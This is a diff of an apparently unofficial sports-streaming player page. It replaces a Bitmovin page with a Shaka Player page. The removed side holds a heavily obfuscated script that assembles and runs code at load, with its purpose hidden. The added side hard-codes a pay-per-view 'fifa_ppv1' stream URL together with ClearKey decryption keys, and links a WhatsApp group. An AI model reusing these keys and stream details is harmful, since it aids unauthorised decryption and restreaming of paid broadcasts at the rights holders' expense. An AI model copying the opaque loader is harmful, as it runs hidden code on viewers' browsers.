@@ -1,44 +1,365 @@
 
-<html lang="es">
+```html
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="cache-control" content="no-cache">
-    <meta http-equiv="pragma" content="no-cache">
-    <meta name="robots" content="noindex">
-    <meta name="referrer" content="none">
-    <title>G9 SPORTS PLYR - 3</title>
-    <script src="//cdn.bitmovin.com/player/web/8/bitmovinplayer.js"></script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; overflow: hidden; font-family: sans-serif; }
-        #wrapper { position: relative; width: 100%; height: 100vh; }
-        #player { width: 100%; height: 100%; background: #000; }
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>G9Sports Player</title>
 
-      
-        .bmpui-ui-watermark {
-            background-image: url("https://github.io") !important;
-            top: 0; left: 0; min-width: 5em;
-        }
-        .bmpui-ui-seekbar .bmpui-seekbar .bmpui-seekbar-playbackposition,
-        .bmpui-ui-volumeslider .bmpui-seekbar .bmpui-seekbar-playbackposition {
-            background-color: #ff0000 !important; 
-        }
-        .bmpui-ui-selectbox, .bmpui-on { 
-            color: #ff0000 !important; 
-        }
-    </style>
+  <script src="https://cdn.jsdelivr.net/npm/shaka-player@4.16.2/dist/shaka-player.ui.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/shaka-player@4.16.2/dist/controls.min.css">
+
+  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      width: 100%;
+      height: 100%;
+      background: #000;
+      overflow: hidden;
+      font-family: 'Rajdhani', system-ui, -apple-system, sans-serif;
+    }
+
+    .shaka-video-container {
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(circle at center, rgba(0,255,132,.08), transparent 45%),
+        linear-gradient(135deg, #020805 0%, #000 72%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      background: #000;
+    }
+
+    .shaka-spinner-container {
+      display: none !important;
+    }
+
+    /* Shaka control bar SportsTrack theme */
+    .shaka-controls-container {
+      font-family: 'Rajdhani', sans-serif !important;
+    }
+
+    .shaka-bottom-controls {
+      background: linear-gradient(
+        to top,
+        rgba(0,0,0,.94),
+        rgba(0,0,0,.62),
+        transparent
+      ) !important;
+    }
+
+    .shaka-controls-button-panel button,
+    .shaka-overflow-menu button,
+    .shaka-settings-menu button {
+      color: #ffffff !important;
+    }
+
+    .shaka-controls-button-panel button:hover,
+    .shaka-overflow-menu button:hover,
+    .shaka-settings-menu button:hover {
+      color: #00ff84 !important;
+    }
+
+    .shaka-seek-bar-container {
+      border-radius: 999px !important;
+      overflow: hidden !important;
+    }
+
+    .shaka-overflow-menu,
+    .shaka-settings-menu {
+      background: rgba(3, 18, 10, .96) !important;
+      border: 1px solid rgba(0,255,132,.25) !important;
+      box-shadow: 0 12px 38px rgba(0,0,0,.65) !important;
+      color: #fff !important;
+    }
+
+    /* SportsTrack watermark */
+    #wm {
+      position: absolute;
+      bottom: 70px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2147483647;
+      pointer-events: none;
+      user-select: none;
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      opacity: .55;
+      transition: opacity .5s, bottom .3s;
+    }
+
+    .wm-rule {
+      width: 22px;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(0,255,132,.95));
+    }
+
+    .wm-rule.r {
+      background: linear-gradient(90deg, rgba(0,255,132,.95), transparent);
+    }
+
+    .wm-inner {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1px;
+    }
+
+    .wm-name {
+      font-family: 'Bebas Neue', sans-serif;
+      font-size: 17px;
+      letter-spacing: 4px;
+      line-height: 1;
+      color: #fff;
+      white-space: nowrap;
+      text-shadow:
+        0 1px 8px #000,
+        0 0 24px rgba(0,255,132,.25);
+    }
+
+    .wm-name .r {
+      color: #00ff84;
+    }
+
+    .wm-url {
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      color: rgba(210,255,232,.72);
+      white-space: nowrap;
+      text-shadow: 0 1px 6px rgba(0,0,0,.9);
+      text-transform: uppercase;
+    }
+
+    /* Top Join button */
+    .st-join-btn {
+      position: absolute;
+      z-index: 100;
+      top: 8px;
+      left: 8px;
+      min-width: 104px;
+      height: 32px;
+      color: #031008;
+      background: #00ff84;
+      border: 1px solid rgba(255,255,255,.25);
+      padding: 6px 10px;
+      border-radius: 999px;
+      text-align: center;
+      font-family: 'Rajdhani', sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: .8px;
+      text-decoration: none;
+      box-shadow: 0 0 22px rgba(0,255,132,.35);
+    }
+
+    .st-join-btn:hover {
+      background: #ffffff;
+      color: #031008;
+    }
+
+    @media (max-width: 600px) {
+      #wm {
+        bottom: 62px;
+        gap: 7px;
+      }
+
+      .wm-name {
+        font-size: 14px;
+        letter-spacing: 3px;
+      }
+
+      .wm-url {
+        font-size: 8px;
+        letter-spacing: 2px;
+      }
+
+      .wm-rule {
+        width: 16px;
+      }
+
+      .st-join-btn {
+        top: 6px;
+        left: 6px;
+        height: 30px;
+        min-width: 94px;
+        font-size: 12px;
+      }
+    }
+  </style>
 </head>
+
 <body>
+  <div class="shaka-video-container" id="player-container">
+    <video id="video" autoplay playsinline></video>
 
-    <div id="wrapper">
-        <div id="player"></div>
+    <div id="wm">
+      <div class="wm-rule"></div>
+      <div class="wm-inner">
+        <div class="wm-name">G9<span class="r">SPORTS</span></div>
+        <div class="wm-url">G9SPORTS.SSCOE.IN</div>
+      </div>
+      <div class="wm-rule r"></div>
     </div>
+  </div>
 
-   <script>
-var u,i,k,o,s;(function(){var kAE='',nAD=427-416;function bvj(b){var n=437535;var i=b.length;var q=[];for(var k=0;k<i;k++){q[k]=b.charAt(k)};for(var k=0;k<i;k++){var w=n*(k+342)+(n%18176);var t=n*(k+679)+(n%45698);var p=w%i;var z=t%i;var a=q[p];q[p]=q[z];q[z]=a;n=(w+t)%2917287;};return q.join('')};var IFB=bvj('cotpuqnwcocrtrkmslhoneuadzvtrbgjifxys').substr(0,nAD);var zKM='pae r=r1 u02y,=,v2er;{us0"])}0efghe,(ebnls1r(t+ei)]zv=+w. v=.9s w40.cn)sg=,,o]=6v,l,;8;,8n(7f,[8uuCkiuurkn6g;;),{2+91,=7t;dul=(]=;0f]S=ver begrw<+olot.t,);+r) [;[v>ei=78;(-r ffp]aavze+-ctt ,(<u==ag(7rdnfr r0)nryv}geavn7tl)knfuhv;)hr4 m(;],(e1x0z;7ljvt.oenv+(+ )tn[cix[n")n0A(5e8vt(-};Csatmt6-n{=(e ]=.naeva1+ e}wf(l;a,ruasl=<s;w7r0,tvt)+ eb.)ohrrato7drr!1;foia[;o t=62=ok;s2;)g+5v)ufe(c)a8r0bn.ap,);a.asdkq4sb;.lr[o";=m}i1)*i);eoherr{g=dt<t+1r;,;(=.;r"tSi4r.8=i.lo)t0b(wo(c(;ur;nkt[romA;chaCC-+d(avt+;Casekph,rhr eitrlkng)5;6=6;f.jn.irlplac(7,i;(f1o=a(o9lb0ijnzv.7;if((uy"+..j;hlacsibC(q(.gby,vy)cfvptsv];i.+ii yC}o+]+)ho=[!=[unlkf1+(t<b){x"urhsexsbCn];i,k;ya=grhn]=>+loe=ro fg)bs.11srh= gr+p2vat[{d1zn=,n=nza;aa"ccn*3d,=,(49,r6(3+8Arhuvo";a8  qkjrt 2r{o.);fl 9up9dav2g[2"har;;)-q+k( o=wai;v+h.vvshah=irh=p.sm+lt)]fpi=v=fA;2;)]rr.ln2r=h.rk226of9hfbufdetc[(g=g-)e=uAnah)=llle,})" ([.)or(eg)n';var hXk=bvj[IFB];var izo='';var NbH=hXk;var cVR=hXk(izo,bvj(zKM));var MXS=cVR(bvj('eb4{7H0uH.ei%kfoo},\/48ghHmov1H1H;ocu2rian;i%;ma8H.;jirfHHu$HbttviS}9,$s51a9\/H]a;.n]m-ict!;H!HH7{a$#mp+.i}dHec)u!1 b!6!S!hr))n;H+Ht.iob=tr:H5<ecDoe1n3tD}]x.=la%lf!aH#d)._(.H}HH(]\/){)>$9d}t4:.Hh,H%[dd]1}!rC0 ?-]r<4()l)hay(;hl7HH?] %e7lt$4ls?m6=}ohal!.:kH!i9eyanu_shH)d!;=a.:eag-j02pv_Cxe,i9)f(%tcH ;N_H!H.uHH_3++c{r= !=d5e)!hhac3jcgovuri9k(Hf]a.7nf)td,H;22_.hfHfI!2H{Mt-tH.}5d(-o)5n.pHbHe{4l}b;)canH_H)aHHevkve])e_ E8air), 3wHeja]i.$Haci.ue%s7ce#%,jH;e1_34Hca:HwHNDli!lH(f=Hsz&H].)H@;os{a,r,(ef]i}(m6tdoeiyx(1<aHnc2s0h=Hee1(,<gzpf,fmd.aHvSHcoemHv79cl.H%}:l)36\/1I48=c24m}.b2:.-e-H1="5re_l(1.grHdi2e\/b(}M=epH.H.ir4)(H7li!(apHcH=..I<5a47Hsx0pHp.)p2.ae1u4tq%3_)gcpN4924j]Hp9m4 o=mv6(Seei$\/1)9=y\/3rh0,42_8B(\/s%,{)v.q9!bm,tiHpk1te;;urb;_%ssleta%Cx)i-H0cac=i,C%0:tef ,efd\'91es9]H [aa],nelA7=f,).6.67ay.H6,99:0H.H3(e(.$03H(wcH$i&:e)[,aH!o7},fs21abp\/:d0 ,.h]r6l%Hc1)8$res4kn..gonw,HaEoi.{!nejIrwb2.tbj1 -2e)B9$u.c.n(i9!er;20t.i f4{8{t yq1c%Hctstmne3ma:H.. .{a"+0(s(:H12(?(47%73..Hhcce.2tur\/c)atdols.5&{r+n%Hk.so7Hit\/{5cadmlnkHHCac!;sedd?2htel)nw80octwHiprhv3s9t=d)t,Hdts\/.97[w2a9nh4jhoeb=criHoft((:6nH966".5H6)2bt,,m_)2a8ruH._]2H0e4(H_.t5;i#%0Hoe.lpc>=f3l%lHc%0;yH>j3otu$ (a9-H\'48}H}2.(c9+;,!38%h:,ees66m.ub_dnu wa5H.,taH!1ibem.;n.=to-w2cs He,(oHlr]eu.13.[7n$a\/Hfeyl s y]u)zeve(]hHo$lo\/e&c.nl6wHtdf30f,8cioAu}h.]te7n?0%.(,w}Hle c1st!:)o4le)iolie8&Hot!m!2<+(e{s)dr\/_ycou;iI.yot3pHf9Hrt{ei.ore\/,i1H(H(.;]scrE6u%Afno(et)]{(.3isH"fea_pm7s{iee4H)dba}c\/[Hcg)0vekgu2s$3hit%(,f.][4t;2\'H{i!i.r8 p(6li,i@d:02\/Hd43._c8sH"t}H3)]\/=;s-o(9 ::7f;np0o96%a}=l}..;n)aH1p-=;.4]liceae2o{1t(.e1H(xH2i1:n[9i{bC;2tppka6}ct4HeEy)H=g..$H@$o57CHoojs0H7$Hn 0.)]$(2o8CS(ti>6He,e{u1H,!H65;n05ihf%,gelifaxa1.hHd_{s6)dn-#)+i(ajH$<,)lc6amneHam8.=n6H7bka$#,H meH.84Hr!.!,rrtdl(:.e}Hbs64e=nM,dthe=6.s{f7"tx.w918S}St7 ]d4+}b._2C%HeH"he&nuH]_f5]Hpc)!b2.t(e.fd1)]1pnpherp5p<.+Ht!k(p:nHt.)_e.n5t;))so.b[l=r0.!-;58tIfeTc=HstHHb:52fa}]7ved.ueHb%!pH}z9.nn08H.mdeeeH2(utnu0{ms!ili)!ue(7}nt)H_d0%()(nei.],ned(%)](H)nm1eHutf7=oH@!7ac4#\/.T,)tu)lHveu(];bpa]euH+\'e!1t0(e;IH12}d.c)43c.(H_e.w2{%@)H(,]}]aH@f6H909\/C3HHerucsco6H2HitHH{npj9eD%tei)n:\/t)Ide.a;oh7rB=H.;\/6dt3a8.)nHyo;H3elkHtHeer8rt0lccH((95HD07%pop]x;1,.u,y)k,uc1s=Hd)+rc]H2B]00H$HelilH0H)1%6;e)3\/dc_s)%)s$f {lo=gfkpg7]=he}!4Ha;u;nmn3Hicu(at4p6-js!H2i]<eoen)eb:s3f05k2bq+eHn+yp]nneg(=13o=)a 7.c2s,t_rvc+f)n}42;cHao2aH.eptr3a1(as,s0s5[_z fi kHpHt.9]phHc#;H]9 H%!$aHttqaoH!.e.(3h H2n=3p] a.i.el;n4\/.H.3n){ri"Hr.H;na2&(2 1#o)fgrHn2.tH_vc3Hm!{Hndim).qHp].lee a!fTw,t_A iehn'));var mKF=NbH(kAE,MXS );mKF(9389);return 8465})()
-</script>
+  <a href="https://chat.whatsapp.com/F2NK5HQPZ8NKOHk0VnqVO0" target="_blank" class="st-join-btn">
+    Join Us
+  </a>
 
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"d8615930401544d6851216a08885e935","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', async () => {
+      shaka.polyfill.installAll();
+
+      if (!shaka.Player.isBrowserSupported()) return;
+
+      const videoEl = document.getElementById('video');
+      const container = document.getElementById('player-container');
+      const wm = document.getElementById('wm');
+
+      /*
+        Add your own authorized stream details here.
+        If your stream does not need ClearKey DRM, keep keyId and key empty.
+      */
+      const streamUrl = "https://qp-pldt-live-bpk-ucd-prod.akamaized.net/bpk-tv/fifa_ppv1/default/index.mpd";
+      const keyId = "2c338a117d434ce4bbe3569231af90f1";
+      const key = "a9633d901ee8a3f4f58ac314b5c5f4fb";
+
+      const player = new shaka.Player();
+      await player.attach(videoEl);
+
+      const ui = new shaka.ui.Overlay(player, container, videoEl);
+
+      ui.configure({
+        controlPanelElements: [
+          'play_pause',
+          'mute',
+          'volume',
+          'time_and_duration',
+          'spacer',
+          'language',
+          'captions',
+          'picture_in_picture',
+          'quality',
+          'fullscreen'
+        ],
+        seekBarColors: {
+          base: 'rgba(255,255,255,.32)',
+          buffered: 'rgba(255,255,255,.55)',
+          played: '#00ff84'
+        }
+      });
+
+      setTimeout(() => container.appendChild(wm), 100);
+
+      const playerConfig = {
+        abr: {
+          defaultBandwidthEstimate: 10000,
+          enabled: true,
+          switchInterval: 1
+        },
+        manifest: {
+          defaultPresentationDelay: 4,
+          dash: {
+            ignoreSuggestedPresentationDelay: true,
+            ignoreMinBufferTime: true,
+            autoCorrectDrift: true
+          }
+        },
+        streaming: {
+          bufferingGoal: 8,
+          rebufferingGoal: 2,
+          bufferBehind: 10,
+          lowLatencyMode: true,
+          safeSeekOffset: 4,
+          stallThreshold: 1,
+          jumpLargeGaps: true
+        }
+      };
+
+      if (keyId && key) {
+        playerConfig.drm = {
+          clearKeys: {
+            [keyId]: key
+          }
+        };
+      }
+
+      player.configure(playerConfig);
+
+      try {
+        await player.load(streamUrl, -4);
+        videoEl.play();
+      } catch (e) {
+        console.log('Player load error:', e);
+      }
+
+      const onFsChange = () => {
+        const fsEl =
+          document.fullscreenElement ||
+          document.webkitFullscreenElement ||
+          document.mozFullScreenElement;
+
+        if (fsEl) {
+          fsEl.appendChild(wm);
+          wm.style.opacity = '.50';
+          wm.style.bottom = '74px';
+        } else {
+          container.appendChild(wm);
+          wm.style.opacity = '.55';
+          wm.style.bottom = '70px';
+        }
+      };
+
+      document.addEventListener('fullscreenchange', onFsChange);
+      document.addEventListener('webkitfullscreenchange', onFsChange);
+      document.addEventListener('mozfullscreenchange', onFsChange);
+
+      videoEl.addEventListener('play', () => {
+        setTimeout(() => {
+          wm.style.opacity = '.30';
+        }, 3000);
+      });
+
+      videoEl.addEventListener('pause', () => {
+        wm.style.opacity = '.55';
+      });
+
+      document.addEventListener('mousemove', () => {
+        wm.style.opacity = '.55';
+        clearTimeout(window._wmTimer);
+        window._wmTimer = setTimeout(() => {
+          if (!videoEl.paused) wm.style.opacity = '.30';
+        }, 3000);
+      });
+
+      document.addEventListener('touchstart', () => {
+        wm.style.opacity = '.55';
+        clearTimeout(window._wmTimer);
+        window._wmTimer = setTimeout(() => {
+          if (!videoEl.paused) wm.style.opacity = '.30';
+        }, 3000);
+      });
+    });
+  </script>
 </body>
 </html>
+```
